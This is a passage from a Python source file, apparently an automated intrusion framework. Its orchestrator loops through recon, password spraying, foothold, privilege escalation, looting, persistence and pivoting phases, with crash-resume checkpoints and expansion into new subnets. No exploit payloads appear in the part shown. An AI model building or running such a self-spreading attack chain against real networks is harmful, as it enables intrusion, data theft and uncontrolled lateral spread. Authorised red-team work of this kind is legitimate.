                return
            try:
                await coro
            except Exception as exc:
                self._emit(phase, f"phase failed: {type(exc).__name__}: {exc}")
                # Phase failed — NOT added to phases_completed, so it re-runs
                # on resume. Continue to next phase (the old "never raises"
                # contract: a dead scanner should not kill a foothold you
                # already have). Checkpoint current progress even on failure.
                _save_state()
                return
            # Phase completed — record it and checkpoint.
            self.state.phases_completed.append(phase_name)
            _save_state()

        round_n = 0
        while self.cfg.max_rounds == 0 or round_n < self.cfg.max_rounds:
            round_n += 1
            self.state.round = round_n
            # Clear phases_completed at the start of each round. Phases must
            # re-run with new pivot hosts. The set is only used for crash-resume
            # within a single round.
            self.state.phases_completed = []
            self._emit(ChainPhase.ROUND, f"=== round {round_n} ===")
            await _run_phase(ChainPhase.RECON, self.phase_recon())
            await _run_phase(ChainPhase.ENUMERATE, self.phase_enumerate())
            await _run_phase(ChainPhase.SPRAY, self.phase_spray())
            await _run_phase(ChainPhase.FOOTHOLD, self.phase_foothold())
            await _run_phase(ChainPhase.PRIVESC, self.phase_privesc())
            await _run_phase(ChainPhase.ESCALATE, self.phase_escalate())
            await _run_phase(ChainPhase.LOOT, self.phase_loot())
            await _run_phase(ChainPhase.PERSIST, self.phase_persist())
            await _run_phase(ChainPhase.PIVOT, self.phase_pivot())
            # Final checkpoint after the full round (redundant with per-phase
            # checkpoint but ensures the round counter is persisted).
            _save_state()
            if not self.cfg.targets:
                self.state.stopped = True
                self.state.stop_reason = "no new pivot subnets; growth exhausted"
                break
        else:
            self.state.stopped = True
            self.state.stop_reason = f"reached max_rounds={self.cfg.max_rounds}"
        return self.state


def run_chain(config: ChainConfig, on_phase: Callable | None = None) -> ChainState:
    """Build an orchestrator and run it. Convenience entry point."""
    return ChainOrchestrator(config, on_phase=on_phase).run()